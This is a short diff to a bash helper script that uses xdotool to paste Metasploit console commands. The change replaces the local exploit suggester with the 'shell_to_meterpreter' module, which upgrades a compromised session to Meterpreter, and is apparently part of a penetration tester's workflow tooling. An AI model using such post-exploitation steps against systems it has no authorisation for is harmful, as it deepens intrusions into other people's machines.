@@ -1,7 +1,7 @@
 #!/bin/bash
 
 : '
-meterpreter: set windows post exploit suggester
+meterpreter:  upgrade shell to meterpreter
 '
 
 source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
@@ -12,11 +12,7 @@ generate_form "SESSION"
 
 SESSION=${form_data["SESSION"]}
 
-paste_command "use post/multi/recon/local_exploit_suggester"
-xdotool key Return
-sleep 1
-
-paste_command "sessions"
+paste_command "use multi/manage/shell_to_meterpreter"
 xdotool key Return
 sleep 1
 
@@ -24,6 +20,6 @@ paste_command "set SESSION ${SESSION}"
 xdotool key Return
 sleep 0.8
 
-paste_command "exploit"
+paste_command "run"
 xdotool key Return
 
